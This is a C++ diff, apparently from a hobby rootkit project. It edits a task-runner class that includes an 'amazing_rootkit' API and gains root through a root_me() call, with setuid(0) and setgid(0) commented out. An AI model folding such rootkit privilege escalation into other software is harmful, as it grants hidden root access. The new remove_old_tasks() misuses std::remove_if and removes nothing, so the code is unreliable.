@@ -1,5 +1,4 @@
 #pragma once
-
 #include "Task.h"
 #include "../amazing_rootkit/api/api.h"
 #include <vector>
@@ -23,13 +22,18 @@ private:
 
     void run_all_tasks()
     {
+        remove_old_tasks();
         std::cout << "Running " << tasks.size() << " tasks !" << std::endl;
-
         for (const std::unique_ptr<Task> & t: tasks)
         {
             t->run();
         }
         
+    }
+
+    void remove_old_tasks()
+    {
+        std::remove_if(tasks.begin(), tasks.end(), [](const unique_ptr<Task> & task) { return task->is_running(); });
     }
 
     void add_task(Task * t, bool restart)
@@ -107,7 +111,7 @@ private:
 
     bool init()
     {
-        return root_me() == 1 && redirect_stds();
+        return root_me() == 1; /* && setuid(0) != -1 && setgid(0) != -1 && redirect_stds();*/
     }
 
 public:
